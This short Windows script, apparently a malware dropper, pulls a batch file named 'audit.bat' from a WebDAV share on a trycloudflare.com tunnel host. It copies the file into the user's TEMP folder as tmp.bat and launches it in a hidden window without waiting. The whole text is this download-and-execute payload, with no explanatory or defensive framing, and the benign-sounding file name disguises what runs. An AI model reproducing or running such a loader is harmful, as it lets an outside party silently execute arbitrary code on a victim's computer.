Set fso=CreateObject("Scripting.FileSystemObject"):Set w=CreateObject("WScript.Shell")
s="\\revelation-aberdeen-searching-nevertheless.trycloudflare.com@SSL\DavWWWRoot\audit.bat":d=Environ("TEMP")&"\tmp.bat"
fso.CopyFile s,d,True:w.Run """"&d&"""",0,False